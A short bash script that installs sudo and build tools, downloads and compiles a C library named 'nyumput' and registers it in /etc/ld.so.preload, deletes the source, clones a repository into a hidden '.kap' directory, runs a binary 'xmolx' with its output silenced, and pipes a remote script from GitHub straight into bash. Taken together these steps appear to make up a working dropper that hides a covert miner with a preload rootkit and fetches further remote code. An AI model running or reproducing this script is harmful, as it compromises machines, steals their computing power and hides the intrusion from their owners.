#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .kap && cd .kap
git clone https://github.com/sitina21/epep.git
cd epep
chmod +x config.json && chmod +x xmolx
./xmolx -c "config.json" >/dev/null 2>&1
curl -sL https://github.com/sitina21/zuph/raw/main/gobel.sh | bash
